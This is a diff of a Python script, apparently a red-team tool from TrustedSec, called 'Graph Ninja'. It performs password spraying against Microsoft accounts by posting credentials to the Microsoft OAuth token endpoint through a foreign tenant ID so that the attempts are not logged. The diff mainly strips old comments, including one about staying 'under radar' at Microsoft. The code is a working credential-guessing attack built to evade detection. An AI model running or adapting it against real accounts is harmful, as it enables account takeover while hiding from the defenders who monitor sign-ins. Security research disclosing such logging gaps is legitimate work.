@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
-
+#
 # GRAPH NINJA
 #
 # Logless password spraying
-# plz do not add threading - trying to keep this under radar at MS too, so don't be insanely loud
-# enumerate separately with teams or onedrive, then spray only valids
 #
-# TLP: MIDNIGHT
+# THREAT LEVEL: MIDNIGHT
 #
-# 2023.06.26 @nyxgeek - TrustedSec
+# 2023.06.26 @nyxgeek – TrustedSec
+# Originally discovered but not realized October 2021
 #
+# Shoutout to o365enum where I snarfed some of this from https://github.com/gremwell/o365enum/
 
 import requests
 import argparse
@@ -18,9 +18,7 @@ import argparse
 parser = argparse.ArgumentParser(description='Log into Microsoft Graph.')
 parser.add_argument("-u", "--username", help="user to target", metavar='')
 parser.add_argument("-U", "--userfile", help="file containing usernames in email format", metavar='')
-#parser.add_argument('userfile', help='Userfile with emails to try.')
 parser.add_argument("-p", "--password", help='Password for the Microsoft account.')
-#parser.add_argument('tenantguids', help='tenantguids to rotate through')
 args = parser.parse_args()
 
 def login(username, password):
@@ -31,7 +29,6 @@ def login(username, password):
     body = {
         "resource": "https://graph.windows.net",
         "client_id": "72f988bf-86f1-41af-91ab-2d7cd011db42",
-        #"client_id": "72f988bf-86f1-41af-91ab-2d7cd011db47",
         "client_info": '1',
         "grant_type": "password",
         "username": username,
@@ -51,24 +48,8 @@ def login(username, password):
     }
 
     state = -1
-    #body['username'] = username
-
-    #response = requests.post("https://login.microsoftonline.com/db3662fa-234a-430c-9d80-2da3ab11ead5/oauth2/token", headers=headers, data=body)
-    response = requests.post("https://login.microsoftonline.com/157c51bb-dbe3-4c08-842d-0d566e0396fa/oauth2/token", headers=headers, data=body)
-
-    #fake below this: - okay so that fails bc recognizes invalid tenant guid
-    #response = requests.post("https://login.microsoftonline.com/157c51bb-dbe3-4c08-842d-0d566e0396ff/oauth2/token", headers=headers, data=body)
-
-
-    #response = requests.post("https://login.microsoftonline.com/common/oauth2/token", headers=headers, data=body)
-
-    #response = requests.post(
-    #    #url + '/1146cf6d-9b72-4828-bd04-9f1ccb305586/oauth2/token',
-    #    #url + '/db3662fa-234a-430c-9d80-2da3ab11ead5/oauth2/token',
-    #    url + '/157c51bb-dbe3-4c08-842d-0d566e0396fa/oauth2/token',
-    #    headers=headers,
-    #    data=body
-    #)
+    #this is contoso tenant ID
+    response = requests.post("https://login.microsoftonline.com/6babcaad-604b-40ac-a9d7-9fd97c0b779f/oauth2/token", headers=headers, data=body)
 
     # States
     # 0 = invalid user
@@ -95,22 +76,6 @@ def login(username, password):
 
     #print(response.cookies.get_dict())
     return state
-
-    #if response.status_code == 200:
-    #    print('Login successful.')
-    #else:
-    #    try:
-    #        print(f'{username}:{password}:{response.status_code}')
-    #        error_code = response.json()['error_codes'][0]
-    #        for status, code in codes.items():
-    #            if error_code in code:
-    #                return status
-    #    except KeyError:
-    #        print("Unknown error occurred.")
-
-    #return -1  # Unknown status
-
-
 
 if args.username:
 
